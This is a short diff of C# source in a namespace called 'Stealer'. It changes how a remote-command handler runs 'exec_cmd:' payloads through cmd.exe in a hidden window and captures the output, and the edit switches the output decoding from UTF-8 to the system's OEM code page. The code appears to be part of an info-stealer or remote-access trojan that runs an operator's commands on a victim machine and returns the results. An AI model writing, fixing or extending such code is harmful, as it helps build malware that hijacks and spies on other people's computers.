@@ -103,7 +103,7 @@ namespace Stealer
             else if (cmdLower.StartsWith("exec_cmd:"))
             {
                 string payload = cmd.Substring("exec_cmd:".Length);
-                RunShellCommand("cmd.exe", "/c chcp 65001 > nul 2>&1 & " + payload, "cmd_res");
+                RunShellCommand("cmd.exe", "/c " + payload, "cmd_res");
             }
             else if (cmdLower.StartsWith("exec_ps:"))
             {
@@ -159,8 +159,8 @@ namespace Stealer
                         RedirectStandardOutput = true,
                         RedirectStandardError = true,
                         CreateNoWindow = true,
-                        StandardOutputEncoding = System.Text.Encoding.UTF8,
-                        StandardErrorEncoding = System.Text.Encoding.UTF8
+                        StandardOutputEncoding = System.Text.Encoding.GetEncoding(System.Globalization.CultureInfo.CurrentCulture.TextInfo.OEMCodePage),
+                        StandardErrorEncoding = System.Text.Encoding.GetEncoding(System.Globalization.CultureInfo.CurrentCulture.TextInfo.OEMCodePage)
                     };
                     using (var p = System.Diagnostics.Process.Start(psi))
                     {
